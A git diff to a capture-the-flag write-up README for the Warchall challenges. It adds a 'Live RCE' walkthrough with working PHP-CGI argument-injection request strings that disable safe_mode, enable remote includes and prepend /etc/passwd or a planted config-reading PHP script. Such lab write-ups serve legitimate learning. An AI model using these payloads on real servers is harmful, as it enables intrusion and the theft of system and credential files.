@@ -1,4 +1,9 @@
 # Warchall-challenge
+## Of the 11 challenges we had to deal with, I succeeded in 8. Here are the 3 challenges I couldn't solve:
+* Nurxxed
+* SSH... Z is sleeping
+* 7 Tropical Fruits
+## So I'm going to explain step by step how I captured the flag for the 8 challenges I successfully completed.
 #
 > To start with, I create an SSH account and then connect to the account I've just created by using a terminal.
 # 1. The Beginning
@@ -178,7 +183,32 @@ echo "PGh0bWw+Cjxib2R5Pgo8cHJlIHN0eWxlPSJjb2xvcjojMDAwOyI+dGVoIGZhbGcgc2kgbmFlci
 echo "PGh0bWw+Cjxib2R5Pgo8cHJlPk5PVEhJTkcgSEVSRT8/Pz88L3ByZT4KPC9ib2R5Pgo8L2h0bWw+CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCByZXR1cm4gJ0xvd19INE5HSU5HX0ZydWl0JzsgPz4K" | base64 -d -i
 ```
 * The password will then be displayed in the bottom left-hand corner
-# 7. Tryouts
+# 7. Live RCE
+## This is the way I solved the challenge. I found that a nice way to test for this vulnerability was to use:
+```
+http://rce.warchall.net/?-s
+```
+* the source code is displayed. Now I know I have to see what's inside config.php. Now I knew what to research on Goolgle. After some time I found this attack vector. It is supposed to allow me to include a file remote or local. Doing:
+```
+http://rce.warchall.net/index.php
+?-dsafe_mode=Off+-ddisable_functions=NULL+-dallow_url_fopen=On+-dallow_url_include=On+-dauto_prepend_file=http:://google.com/robots.txt
+```
+> did not work, but this did:
+```
+rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/etc/passwd
+```
+* Then I knew I had access to SSH and I could put a basic PHP script in a file in:
+```Plaintext code for /var/tmp/s.txt
+<?php
+ 
+echo file_get_contents("../config.php");
+```
+* Then I know I had to run:
+```
+rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/s.txt
+```
+* At the first sight it did not work. Nothing than the index.php's content was shown in the browser. But the flag for this level is now stoked in `/var/tmp/s.txt`
+# 8. Tryouts
 > Find in /home/level/matrixman/13_tryouts
 > * In /home/level/matrixman/13_tryouts, there's a C language code called tryouts.c and its compiled version tryouts. There's also a solution.txt file that we don't have access to.
 > * The **tryouts.c** file asks us to guess a random number generated using /dev/urandom
